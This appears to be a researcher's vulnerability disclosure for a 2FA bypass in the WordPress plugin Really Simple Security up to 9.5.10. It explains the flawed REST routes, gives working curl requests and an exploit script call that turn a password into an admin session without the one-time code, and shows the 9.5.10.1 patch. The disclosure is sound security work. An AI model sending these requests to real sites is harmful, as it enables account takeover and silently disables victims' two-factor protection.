# Really Simple Security `<= 9.5.10`: 2FA Bypass

> The second factor in "Really Simple Security" turned out to be optional.
> CVSS **8.1**. **Fixed in 9.5.10.1**

If you have an admin password and you can submit it to a site running RSSSL with email 2FA enabled (the default state for the administrator role after onboarding), you can complete the login without the OTP. 

## What's broken

Two REST routes are wired up to call `wp_set_auth_cookie` after checking only the `login_nonce` that the plugin hands the attacker on the 2FA challenge page:

- `POST /wp-json/really-simple-security/v1/two-fa/v2/do_not_ask_again`
- `POST /wp-json/really-simple-security/v1/two-fa/v2/skip_onboarding`

The permission callback (`class-rsssl-abstract-controller.php:102`) verifies that nonce. The nonce proves the password step was passed; it doesn't prove the second factor was answered. Both `disable_two_fa_for_user` (`class-rsssl-base-controller.php:59`) and `skip_onboarding` (`:104`) then call `authenticate_and_redirect` (`trait-rsssl-two-fa-helper.php:98`), which does this:

```php
wp_set_auth_cookie($user_id, true);
```

Game over. As a bonus, `do_not_ask_again` flips every 2FA provider on the victim's account to `disabled` on its way out, with no notification to the user.

## See it run

[`poc.mp4`](./poc.mp4) is the 60-second video walkthrough.

```bash
python3 exploit.py http://localhost:8888 <username> '<password>'
```

Or with curl, two requests:

```bash
# 1) Submit the password. Scrape login_nonce out of the 2FA challenge page.
curl -s -d 'log=<username>&pwd=<password>&wp-submit=Log+In&testcookie=1' \
  -b 'wordpress_test_cookie=WP%20Cookie%20check' \
  http://localhost:8888/wp-login.php \
  | grep -oE '"login_nonce":"[a-f0-9]+"'

# 2) Trade the nonce for an auth cookie. Skip the OTP entirely.
curl -s -i -H 'Content-Type: application/json' \
  -d '{"user_id":"1","login_nonce":"<nonce>"}' \
  http://localhost:8888/wp-json/really-simple-security/v1/two-fa/v2/do_not_ask_again
# 200 OK + Set-Cookie: wordpress_logged_in_*  (live admin session, no OTP entered)
```

## The patch

9.5.10.1 added a `has_configured_provider($user)` guard that 403s the request before `authenticate_and_redirect` runs:

```php
if ($this->has_configured_provider($user)) {
    return new WP_REST_Response(
        ['error' => __('Two-Factor Authentication must be completed before it can be disabled.', 'really-simple-ssl')],
        403
    );
}
```

[Patched file in WordPress.org SVN.](https://plugins.svn.wordpress.org/really-simple-ssl/tags/9.5.10.1/security/wordpress/two-fa/controllers/class-rsssl-base-controller.php)

**Dr. John Umoru** · ClarenSec · [clarensec.com](https://clarensec.com) · [@johnumorujo](https://twitter.com/johnumorujo)
